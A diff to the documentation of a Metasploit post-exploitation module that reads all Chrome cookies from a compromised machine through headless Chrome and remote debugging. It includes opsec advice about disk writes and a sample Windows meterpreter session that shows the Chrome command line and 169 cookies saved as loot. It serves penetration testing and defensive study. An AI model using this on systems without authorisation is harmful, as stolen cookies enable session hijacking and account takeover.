@@ -1,16 +1,20 @@
 ## Gather Chrome Cookies
 
-Uses [Headless Chrome](https://developers.google.com/web/updates/2017/04/headless-chrome) and [Chrome's Remote Debugging](https://chromedevtools.github.io/devtools-protocol/) to read all cookies from the Default Chrome profile of the user.
+Reads all cookies from the Default Chrome Profile on the target machine. Uses [Headless Chrome](https://developers.google.com/web/updates/2017/04/headless-chrome) and [Chrome's Remote Debugging](https://chromedevtools.github.io/devtools-protocol/).
 
 ## Opsec
 
-This writes to disk temporarily. You may want to consider the tradeoff between getting the user's Chrome cookies and the noisiness of writing to disk.
+### Disk writes
+This writes randomly-named files to disk temporarily. You may want to consider the tradeoff between getting the user's Chrome cookies and the noisiness of writing to disk.
 
 The module writes a random 10-15 character file containing HTML to a directory you can specify via `WRITABLE_DIR`.
 
+### Running processes
+On non-Windows non-meterpreter sessions, a headless Chrome process will be left running after module execution is completed. You can still find and kill this process manually after the module execution is completed.
+
 ## Vulnerable Application
 
-This technique works on Chrome 59 or later on all operating systems. This module has been tested on Windows, Linux, and OSX. Windows shell sessions are currently not supported.
+This module works on Chrome 59 or later on all operating systems. This module has been tested on Windows, Linux, and OSX.
 
 Chrome does not need to be running on the target machine for this module to work.
 
@@ -40,14 +44,14 @@ Chrome does not need to be running on the target machine for this module to work
 
 ## Scenarios
 
-### Linux (or OS X)
+### Windows
 
   Suppose you've got a session on the target machine.
 
   To extract the target user's Chrome cookies
 
 ```
-msf > use post/multi/gather/chrome_cookies 
+msf > use post/multi/gather/chrome_cookies
 msf post(multi/gather/chrome_cookies) > options
 
 Module options (post/multi/gather/chrome_cookies):
@@ -57,15 +61,24 @@ Module options (post/multi/gather/chrome_cookies):
    CHROME_BINARY_PATH                      no        The path to the user's Chrome binary (leave blank to use the default for the OS)
    REMOTE_DEBUGGING_PORT  9222             no        Port on target machine to use for remote debugging protocol
    SESSION                1                yes       The session to run this module on.
-   WRITABLE_DIR       /tmp             no        Where to write the html used to steal cookies temporarily
+   WRITEABLE_DIR                           no        Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\Local\Temp)
 
 msf post(multi/gather/chrome_cookies) > set session <your session id>
 session => <your session id>
+
 msf post(multi/gather/chrome_cookies) > run
 
-[*] Activated Chrome's Remote Debugging via google-chrome --headless --disable-web-security --disable-plugins --user-data-dir="/home/<username>/.config/google-chrome/" --remote-debugging-port=9222 /tmp/qj9ADWM6Xqh
-[+] 1473 Chrome Cookies stored in /home/<local_username>/.msf4/loot/20181209094655_default_127.0.0.1_chrome.gather.co_585357.txt
+[*] Determining session platform
+[*] Platform: windows
+[*] Type: meterpreter
+[*] Activated Chrome's Remote Debugging (pid: 9452) via "\Program Files (x86)\Google\Chrome\Application\chrome.exe" --window-position=0,0 --enable-logging --v=1 --disable-translate --disable-extensions --disable-background-networking --safebrowsing-disable-auto-update --disable-sync --metrics-recording-only --disable-default-apps --mute-audio --no-first-run --disable-web-security --disable-plugins --disable-gpu  --user-data-dir="\Users\msfdev\AppData\Local\Google\Chrome\User Data"  --remote-debugging-port=9222  \Users\msfdev\AppData\Local\Temp\YaW8HKZdkk2s85D.html
+[+] Found Match
+[+] 169 Chrome Cookies stored in /home/msfdev/.msf4/loot/20190108065112_default_172.22.222.200_chrome.gather.co_082863.txt
+[*] Removing file \Users\msfdev\AppData\Local\Temp\YaW8HKZdkk2s85D.html
+[*] Removing file \Users\msfdev\AppData\Local\Google\Chrome\User Data\chrome_debug.log
 [*] Post module execution completed
+msf5 post(multi/gather/chrome_cookies) >
+
 ```
 
 ## Future features
